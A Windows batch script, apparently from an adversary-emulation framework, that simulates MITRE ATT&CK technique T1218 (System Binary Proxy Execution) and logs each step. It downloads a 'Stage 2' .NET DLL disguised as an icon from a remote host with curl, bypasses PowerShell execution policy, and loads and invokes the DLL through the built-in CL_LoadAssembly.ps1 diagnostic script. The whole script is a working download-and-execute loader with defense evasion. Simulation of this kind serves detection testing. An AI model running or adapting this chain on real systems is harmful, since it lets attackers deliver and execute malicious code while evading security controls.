@echo off
setlocal enabledelayedexpansion

REM --- Placeholder constant declarations (one SET per PHR_* with random names) ---
SET a1B2c3D4=%APPDATA%\11992\56ecba34
SET e5F6g7H8=8690e299.txt
SET i9J0k1L2=https://10.0.0.49/stage/2/icon.png?11992-7
SET m3N4o5P6=ITZEL-S2B
SET q7R8s9T0=11992
SET u1V2w3X4=7
SET y5Z6a7B8=%PUBLIC%\\macula-simulations.log
SET c9D0e1F2=https://10.0.0.49

REM --- Cache timestamp for debug lines ---
SET tsvar=%DATE%/%TIME%

REM --- Begin debug logging (script start) ---
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: script_start>> "!y5Z6a7B8!" 2>nul

REM --- Step 1: Heartbeat fetch (download Stage 2 DLL) ---
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_start>> "!y5Z6a7B8!" 2>nul
curl -k -s -o "!a1B2c3D4!\!e5F6g7H8!" "!i9J0k1L2!"
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_complete>> "!y5Z6a7B8!" 2>nul

REM --- Step 2: Position working directory ---
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: chdir_start>> "!y5Z6a7B8!" 2>nul
cd /d "!a1B2c3D4!" >nul 2>&1
set chdirResult=%errorlevel%
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: chdir_result=!chdirResult!>> "!y5Z6a7B8!" 2>nul

REM --- Step 3: Invoke Stage 2 .NET DLL via PowerShell LOLBIN ---
REM The PowerShell command uses {PHR_*} literals; patcher replaces them before execution.
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: powershell_start>> "!y5Z6a7B8!" 2>nul

powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\11992\56ecba34\8690e299.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"

set psExit=%errorlevel%
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: powershell_end=!psExit!>> "!y5Z6a7B8!" 2>nul

REM --- Step 4: Generate precise timestamp and log TTP line ---
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

if !psExit! equ 0 (
    echo [!timestamp!][TTP][!m3N4o5P6!][!q7R8s9T0!]: T1218^|System Binary Proxy Execution=OK:[]>> "!y5Z6a7B8!" 2>&1
) else (
    echo [!timestamp!][TTP][!m3N4o5P6!][!q7R8s9T0!]: T1218^|System Binary Proxy Execution=FAIL:exitcode=!psExit!>> "!y5Z6a7B8!" 2>&1
)

endlocal